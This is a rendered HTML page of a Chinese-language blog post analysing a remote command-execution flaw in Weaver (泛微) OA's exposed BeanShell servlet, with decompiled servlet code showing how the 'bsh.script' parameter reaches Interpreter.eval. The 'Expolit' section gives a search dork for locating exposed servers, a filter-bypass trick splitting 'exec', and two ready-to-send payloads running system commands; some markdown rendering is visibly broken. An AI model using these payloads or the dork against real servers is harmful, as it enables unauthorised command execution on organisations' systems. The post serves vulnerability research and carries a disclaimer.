@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="漏洞分析,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="泛微OA命令执行，后门般的漏洞">
+<meta name="keywords" content="漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="泛微OA命令执行浅析">
+<meta property="og:url" content="http://yoursite.com/2019/09/25/泛微OA命令执行浅析/index.html">
+<meta property="og:site_name" content="Eight Dimensions">
+<meta property="og:description" content="泛微OA命令执行，后门般的漏洞">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-25T03:18:23.294Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="泛微OA命令执行浅析">
+<meta name="twitter:description" content="泛微OA命令执行，后门般的漏洞">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/25/泛微OA命令执行浅析/">
+
+
+
+
+
+  <title>泛微OA命令执行浅析 | Eight Dimensions</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Eight Dimensions</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/25/泛微OA命令执行浅析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shad0w">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eight Dimensions">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">泛微OA命令执行浅析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-25T11:08:57+08:00">
+                2019-09-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>泛微OA命令执行，后门般的漏洞</p>
+<a id="more"></a>
+
+
+
+<h2 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h2><p>很多脚本都有类似eval的函数，把字符串转换为表达式执行</p>
+<p>比如python有<figure class="highlight plain"><figcaption><span>```、```os.popen('ls *.sh').readlines()```、```subprocess.call (["cmd", "arg1", "arg2"],shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">javascript有```eval(&apos;1+2+3&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>而在java中则有BeanShell的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用maven管理项目依赖包，在```pom.xml```添加</span><br></pre></td></tr></table></figure></p>
+<dependency>
+    <groupid>org.beanshell</groupid>
+    <artifactid>bsh</artifactid>
+    <version>2.0b4</version>
+</dependency>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```java</span><br><span class="line">import bsh.Interpreter;</span><br><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Interpreter in = new Interpreter();</span><br><span class="line">//直接执行java代码</span><br><span class="line">        in.eval(&quot;for(int i=0; i&lt;3; i++) &#123; System.out.println(\&quot;hello\&quot;); &#125;&quot;);</span><br><span class="line">//直接执行系统命令</span><br><span class="line">  			in.eval(&quot;exec(\&quot;whoami\&quot;)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更魔性一点，比如绕一下exec函数检测</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String or = <span class="string">"eval(\"ex\" + \"ec(\\\"pwd\\\")\");"</span>;</span><br><span class="line">System.out.println(or);											<span class="comment">//	eval("ex" + "ec(\"pwd\")");</span></span><br><span class="line">in.set(<span class="string">"order"</span>, in.eval(or));</span><br><span class="line">System.out.println(in.get(<span class="string">"order"</span>));				<span class="comment">//	/h/a/c/k</span></span><br></pre></td></tr></table></figure>
+
+<p>这里exec像是Runtime.getRuntime.exec()一样执行系统命令，但是”eval”是什么呢？</p>
+<p>其实在bsh-2.0h4.jar中有一个commands目录，顾名思义其实就是定义了Interpreter能执行的bsh命令</p>
+<p>![image-20190924134127483](/Users/kaixin.lin/Library/Application Support/typora-user-images/image-20190924134127483.png)</p>
+<p>其中在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```java</span><br><span class="line">/**</span><br><span class="line">	Start an external application using the Java Runtime exec() method.</span><br><span class="line">	Display any output to the standard BeanShell output using print().</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">bsh.help.exec = &quot;usage: exec( String arg )&quot;;</span><br><span class="line"></span><br><span class="line">exec( String arg ) </span><br><span class="line">&#123;</span><br><span class="line">	this.proc = Runtime.getRuntime().exec(arg);</span><br><span class="line">	this.din = new DataInputStream( proc.getInputStream() );</span><br><span class="line">	while( (line=din.readLine()) != null )</span><br><span class="line">		print(line);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```java</span><br><span class="line">bsh.help.eval = &quot;usage: eval( String expression )&quot;;</span><br><span class="line"></span><br><span class="line">Object eval( String expression ) &#123;</span><br><span class="line">    return this.interpreter.eval( expression, this.caller.namespace );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="漏洞URL"><a href="#漏洞URL" class="headerlink" title="漏洞URL"></a>漏洞URL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:/weaver/bsh.servlet.BshServlet</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>根据漏洞url直接定位到BshServlet，BshServlet继承了HttpServlet实现了doGet方法和doPost方法，而doPost方法调用了doGet</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123; doGet(paramHttpServletRequest, paramHttpServletResponse); &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String str1 = paramHttpServletRequest.getParameter(<span class="string">"bsh.script"</span>);</span><br><span class="line">    String str2 = paramHttpServletRequest.getParameter(<span class="string">"bsh.client"</span>);</span><br><span class="line">    String str3 = paramHttpServletRequest.getParameter(<span class="string">"bsh.servlet.output"</span>);</span><br><span class="line">    String str4 = paramHttpServletRequest.getParameter(<span class="string">"bsh.servlet.captureOutErr"</span>);</span><br><span class="line">    <span class="keyword">boolean</span> bool = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (str4 != <span class="keyword">null</span> &amp;&amp; str4.equalsIgnoreCase(<span class="string">"true"</span>))</span><br><span class="line">      bool = <span class="keyword">true</span>; </span><br><span class="line">    Object object = <span class="keyword">null</span>;</span><br><span class="line">    Exception exception = <span class="keyword">null</span>;</span><br><span class="line">    StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">    <span class="keyword">if</span> (str1 != <span class="keyword">null</span>)</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        object = evalScript(str1, stringBuffer, bool, paramHttpServletRequest, paramHttpServletResponse);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception exception1) &#123;</span><br><span class="line">        exception = exception1;</span><br><span class="line">      &#125;  </span><br><span class="line">    paramHttpServletResponse.setHeader(<span class="string">"Bsh-Return"</span>, String.valueOf(object));</span><br><span class="line">    <span class="keyword">if</span> ((str3 != <span class="keyword">null</span> &amp;&amp; str3.equalsIgnoreCase(<span class="string">"raw"</span>)) || (str2 != <span class="keyword">null</span> &amp;&amp; str2.equals(<span class="string">"Remote"</span>))) &#123;</span><br><span class="line">      sendRaw(paramHttpServletRequest, paramHttpServletResponse, exception, object, stringBuffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      sendHTML(paramHttpServletRequest, paramHttpServletResponse, str1, exception, object, stringBuffer, bool);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到”bsh.script”、”bsh.client”、”bsh.servlet.output”、”bsh.servlet.captureOutErr”都是可控的直接通过参数传进来；而其中有猫腻的在”bsh.script”赋值给str1之后传入evalScript函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String str1 = paramHttpServletRequest.getParameter(<span class="string">"bsh.script"</span>);</span><br><span class="line">String str4 = paramHttpServletRequest.getParameter(<span class="string">"bsh.servlet.captureOutErr"</span>);</span><br><span class="line"><span class="keyword">if</span> (str4 != <span class="keyword">null</span> &amp;&amp; str4.equalsIgnoreCase(<span class="string">"true"</span>))</span><br><span class="line">      bool = <span class="keyword">true</span>; </span><br><span class="line">object = evalScript(str1, stringBuffer, bool, paramHttpServletRequest, paramHttpServletResponse);</span><br></pre></td></tr></table></figure>
+
+<p>具体evalScript如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">evalScript</span><span class="params">(String paramString, StringBuffer paramStringBuffer, <span class="keyword">boolean</span> paramBoolean, HttpServletRequest paramHttpServletRequest, HttpServletResponse paramHttpServletResponse)</span> <span class="keyword">throws</span> EvalError </span>&#123;</span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    PrintStream printStream1 = <span class="keyword">new</span> PrintStream(byteArrayOutputStream);</span><br><span class="line">    Interpreter interpreter = <span class="keyword">new</span> Interpreter(<span class="keyword">null</span>, printStream1, printStream1, <span class="keyword">false</span>);</span><br><span class="line">    interpreter.set(<span class="string">"bsh.httpServletRequest"</span>, paramHttpServletRequest);</span><br><span class="line">    interpreter.set(<span class="string">"bsh.httpServletResponse"</span>, paramHttpServletResponse);</span><br><span class="line">    Object object = <span class="keyword">null</span>;</span><br><span class="line">    Object object1 = <span class="keyword">null</span>;</span><br><span class="line">    PrintStream printStream2 = System.out;</span><br><span class="line">    PrintStream printStream3 = System.err;</span><br><span class="line">    <span class="keyword">if</span> (paramBoolean) &#123;</span><br><span class="line">      System.setOut(printStream1);</span><br><span class="line">      System.setErr(printStream1);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      object = interpreter.eval(paramString);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (paramBoolean) &#123;</span><br><span class="line">        System.setOut(printStream2);</span><br><span class="line">        System.setErr(printStream3);</span><br><span class="line">      &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    printStream1.flush();</span><br><span class="line">    paramStringBuffer.append(byteArrayOutputStream.toString());</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">看一下通过```bsh.servlet.captureOutErr```传入的```paramBoolean```，只是和输出有关和命令没有太大关系</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">if (paramBoolean) &#123;</span><br><span class="line">		System.setOut(printStream2);</span><br><span class="line">		System.setErr(printStream3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>再看一下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sendraw设置response返回格式ContentType为```&quot;text/plain&quot;```即原样输出结果；而sendHTML会采用Servlet的模版引擎```SimpleTemplate```渲染，并且会针对```&quot;&amp;&lt;&gt;&quot;```做实体编码</span><br><span class="line"></span><br><span class="line">根据Interpreter的使用来看，这里参数可控那么可以直接传入java代码，也可以调用Interpreter定义的command接口执行命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Expolit</span><br><span class="line"></span><br><span class="line">payload1</span><br></pre></td></tr></table></figure></p>
+<p>bsh.script=eval%0d(“ex”%2b”ec(bsh.httpServletRequest.getParameter(&quot;cmd&quot;))”);&amp;bsh.servlet.output=raw&amp;cmd=whoami</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload2</span><br></pre></td></tr></table></figure>
+
+<p>bsh.script=ProcessBuilder+pb+%3D+new+ProcessBuilder%28new+String%5B%5D+%7B%22whoami%22%7D%29%3B%0D%0Apb.redirectErrorStream%28true%29%3B%0D%0Ajava.io.BufferedReader+reader+%3D%0D%0A++++++++new+java.io.BufferedReader%28new+java.io.InputStreamReader%28pb.start%28%29.getInputStream%28%29%29%29%3B%0D%0AStringBuilder+builder+%3D+new+StringBuilder%28%29%3B%0D%0AString+line+%3D+null%3B%0D%0Awhile+%28+%28line+%3D+reader.readLine%28%29%29+%21%3D+null%29+%7B%0D%0A++++builder.append%28line%29%3B%0D%0A++++builder.append%28%22%5Cr%5Cn%22%29%3B%0D%0A%7D%3B%0D%0Abuilder%3B</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```java</span><br><span class="line">ProcessBuilder pb = new ProcessBuilder(new String[] &#123;&quot;cmd.exe&quot;,&quot;/c&quot;,&quot;whoami&quot;&#125;);</span><br><span class="line">pb.redirectErrorStream(true);</span><br><span class="line">java.io.BufferedReader reader =</span><br><span class="line">        new java.io.BufferedReader(new java.io.InputStreamReader(pb.start().getInputStream()));</span><br><span class="line">StringBuilder builder = new StringBuilder();</span><br><span class="line">String line = null;</span><br><span class="line">while ( (line = reader.readLine()) != null) &#123;</span><br><span class="line">    builder.append(line);</span><br><span class="line">    builder.append(&quot;\r\n&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">builder;</span><br></pre></td></tr></table></figure>
+
+<h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/29/Hybrid-Android协议加解密分析/" rel="next" title="Hybrid Android协议加解密分析">
+                <i class="fa fa-chevron-left"></i> Hybrid Android协议加解密分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Shad0w</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PeteLing" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞背景"><span class="nav-number">1.</span> <span class="nav-text">漏洞背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞URL"><span class="nav-number">2.</span> <span class="nav-text">漏洞URL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞成因"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞成因</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#免责申明"><span class="nav-number">4.</span> <span class="nav-text">免责申明</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shad0w</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
